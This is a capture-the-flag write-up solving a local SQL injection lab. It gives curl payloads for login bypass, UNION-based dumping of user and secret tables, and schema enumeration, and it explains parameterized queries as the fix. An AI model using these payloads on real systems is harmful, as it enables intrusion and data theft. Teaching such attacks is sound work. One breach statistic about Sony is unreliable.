# DEBRIEF: Injection Point

## Solutions

### Flag 1: Bypass Login (Authentication Bypass)
```bash
# Classic SQL injection — make the WHERE clause always true
curl -X POST http://localhost:7334/login \
  -d "username=admin' OR '1'='1' --&password=anything"

# What the server executes:
# SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='anything'
#                                              ↑ always true    ↑ commented out!
```
**FLAG{sql_injection_bypasses_authentication_logic}**

**Why it works:**
- `'` closes the username string
- `OR '1'='1'` makes the condition always TRUE
- `--` comments out the rest (the password check!)

### Flag 2: Dump the Database (UNION Attack)
```bash
# First: figure out how many columns the original query returns
curl -X POST http://localhost:7334/login \
  -d "username=' UNION SELECT 1,2,3,4 --&password=x"

# Dump all users:
curl -X POST http://localhost:7334/login \
  -d "username=' UNION SELECT id,username,password,role FROM users --&password=x"

# Dump the secrets table:
curl -X POST http://localhost:7334/login \
  -d "username=' UNION SELECT id,flag,description,'' FROM secrets --&password=x"

# Get table schema:
curl -X POST http://localhost:7334/login \
  -d "username=' UNION SELECT 1,sql,3,4 FROM sqlite_master --&password=x"
```
**FLAG{union_select_dumps_the_entire_database}**

### Flag 3: In the secrets table
```bash
curl -X POST http://localhost:7334/login \
  -d "username=' UNION SELECT id,flag,description,'' FROM secrets WHERE id=2 --&password=x"
```
**FLAG{never_concatenate_user_input_into_sql_queries}**

### Bonus: File Read via SQLite (advanced)
```bash
# SQLite can read files with readfile() if the extension is loaded
# But the real lesson is: once you have SQL injection, you own the database
```

## Mental Model

```
SQL INJECTION — THE #1 WEB VULNERABILITY (historically):

THE VULNERABILITY:
  Code: query = f"SELECT * FROM users WHERE name='{user_input}'"
  If user_input = "admin' OR '1'='1' --"
  Query becomes: SELECT * FROM users WHERE name='admin' OR '1'='1' --'
  
  The developer INTENDED: check username AND password
  The attacker ACHIEVED: bypass all checks

TYPES OF SQL INJECTION:
├── Authentication bypass (OR '1'='1')
├── UNION-based (extract data from other tables)
├── Error-based (errors reveal database info)
├── Blind (true/false questions via response differences)
├── Time-based blind (SLEEP if condition is true)
└── Stacked queries (run multiple statements with ;)

EXPLOITATION STEPS:
1. Find the injection point (add ' and check for errors)
2. Determine column count (ORDER BY 1, 2, 3... until error)
3. Identify visible columns (UNION SELECT 1,2,3,4)
4. Extract schema (sqlite_master, information_schema)
5. Dump data (UNION SELECT from target tables)

THE FIX — PARAMETERIZED QUERIES:

  VULNERABLE (string concatenation):
    query = f"SELECT * FROM users WHERE name='{input}'"
    
  SECURE (parameterized):
    cursor.execute("SELECT * FROM users WHERE name=?", (input,))
    
  WHY IT WORKS:
    The database treats the parameter as DATA, never as CODE.
    Even if input contains SQL syntax, it's treated as a literal string.

  ALSO SECURE (ORM):
    User.objects.filter(name=input)  # Django ORM
    db.query(User).filter_by(name=input)  # SQLAlchemy

DEFENSE IN DEPTH:
├── Parameterized queries (primary defense)
├── Input validation (whitelist allowed characters)
├── Least privilege (DB user can't DROP tables)
├── WAF rules (Web Application Firewall)
├── Error handling (don't show SQL errors to users!)
└── Prepared statements (precompiled query plans)
```

## Real-World Impact
- Sony Pictures (2011): SQLi exposed 77 million accounts
- Heartland Payment Systems (2008): 130 million cards stolen via SQLi
- TalkTalk (2015): 157,000 customers' data accessed
- OWASP Top 10: Was #1 for over a decade, now part of "Injection" category

## Skills Unlocked
- SQL injection detection and exploitation
- UNION-based data extraction
- SQLite schema enumeration
- Authentication bypass techniques
- Parameterized queries as the fix
- Understanding query parsing vs data parsing
